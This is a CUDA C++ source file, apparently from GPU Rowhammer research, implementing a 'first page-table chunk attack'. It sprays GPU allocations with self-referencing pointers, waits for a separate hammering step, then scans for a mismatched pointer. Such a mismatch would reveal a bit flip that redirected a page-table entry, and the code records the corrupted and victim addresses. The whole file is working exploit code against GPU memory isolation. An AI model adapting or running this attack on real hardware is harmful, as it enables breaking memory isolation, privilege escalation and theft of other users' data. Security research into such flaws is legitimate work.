#include "./sc_firstPTC.cuh"
#include "./sc_firstPTC_hammer.cuh"
#include "./sc_allocallmem.cuh"
#include <string>
#include <fstream>
#include <cmath>
#include <numeric>
#include <chrono>
#include <rh_kernels.cuh>
#include <rh_utils.cuh> 
#include <rh_impls.cuh>
#include <thread>

bool
first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
                       uint64_t alloc_id, double threshold, uint64_t skip,
                       char ***out_first_ptc_ptrs, char **out_agg_ptr,
                       char **out_corrupted_ptr, char **out_victim_ptr, uint64_t* out_corrupt_id, uint64_t* out_victim_id)
{
  int timein;
  char **first_ptc_ptrs;
  RowList agg_row_list;
  std::vector<uint64_t> agg_vec;
  if (!first_PT_chunk_fill (num_alloc_init, num_alloc, alloc_id, threshold,
                            skip, &first_ptc_ptrs, &agg_row_list, &agg_vec))
    {
        printf("Error: First PTC Allocation is wrong\n");
        exit(1);
    }

    std::cout << "Waiting for Identifing Info Intialization... " << '\n';

    for (uint64_t i = 0; i < num_alloc_init - 113; i += 1)
    {
        memset_ptr<<<1, 1>>>(first_ptc_ptrs[i] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
    }

    // memset_ptr<<<1, 1>>>(agg_ptr + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
    cudaDeviceSynchronize();

    // std::cout << std::hex << (void*)agg_ptr << '\n';
    std::cout << std::dec;

    // print_memory<<<1, 1>>>(agg_ptr + 64 * 1024, 100);
    // cudaDeviceSynchronize();

    std::cout << "Identifing Data Placed, Wait for Hammer" << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    bool found_mismatch = false;
    char *temp_addr, *corrupted_addr, *victim_addr;
    uint64_t corrupt_id, victim_id;

    /**
     * For each 64KB, read from cuda. (Change util to write different data to 64KB offset)
     * Find repetition for temp and pair.
     * 
     * If not repetition, find if it matches a PTE.
     * TODO: maybe later extend more
     */
    for (uint64_t i = 0; !found_mismatch && i < num_alloc_init - 113 ; i += 1)
    {
        for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
        {
            cudaMemcpy(&temp_addr, first_ptc_ptrs[i] + j, 8, cudaMemcpyDeviceToHost);
            if (first_ptc_ptrs[i] + j != temp_addr)
            {
                corrupted_addr = first_ptc_ptrs[i] + j;
                corrupt_id = i;
                victim_addr = temp_addr;
                found_mismatch = true;
                break;
            }
        }
    }

    // for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
    // {
    //     cudaMemcpy(&temp_addr, agg_ptr + j, 8, cudaMemcpyDeviceToHost);
    //     if (agg_ptr + j != temp_addr)
    //     {
    //         corrupted_addr = agg_ptr + j;
    //         victim_addr = temp_addr;
    //         found_mismatch = true;
    //         break;
    //     }
    // }

    if (found_mismatch)
    {
        std::cout << "Corrupted: " << (void*) corrupted_addr << ". Victim: "<< (void*)victim_addr << '\n';
    }
    else
    {
        std::cout << "No Corruption Observed." << '\n';
        return false;
    }

    if (out_first_ptc_ptrs)
        *out_first_ptc_ptrs = first_ptc_ptrs;
    if (out_agg_ptr)
        *out_agg_ptr = nullptr;
    if (out_corrupted_ptr)
        *out_corrupted_ptr = corrupted_addr;
    if (out_victim_ptr)
        *out_victim_ptr = victim_addr;
    if (out_corrupt_id)
        *out_corrupt_id = corrupt_id;
    if (out_victim_id)
    {
       char* victim_round_addr = (char*)((uintptr_t)victim_addr & ~((1UL << 20) - 1));
       for (uint64_t i = 0; i < num_alloc_init - 2 ; i += 1)
       {
            if (first_ptc_ptrs[i] == victim_round_addr)
            {
                *out_victim_id = i;
                std::cout << "Found victim id." << '\n';
            }
                
       }
    }


    std::cout << "Continue?" << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    return true;
}

bool
first_PT_chunk_attack (int argc, char *argv[], char ***out_first_ptc_ptrs,
                       char **out_agg_ptr, char **out_corrupted_ptr,
                       char **out_victim_ptr, uint64_t* out_corrupt_id, uint64_t* out_victim_id)
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const uint64_t alloc_id = std::stoll(argv[2]);
    const double threshold = std::stod(argv[3]);
    const uint64_t skip = std::stoull(argv[4]);

    return first_PT_chunk_attack(num_alloc_init, num_alloc, alloc_id, threshold, skip, out_first_ptc_ptrs, out_agg_ptr, out_corrupted_ptr, out_victim_ptr, nullptr, nullptr);
}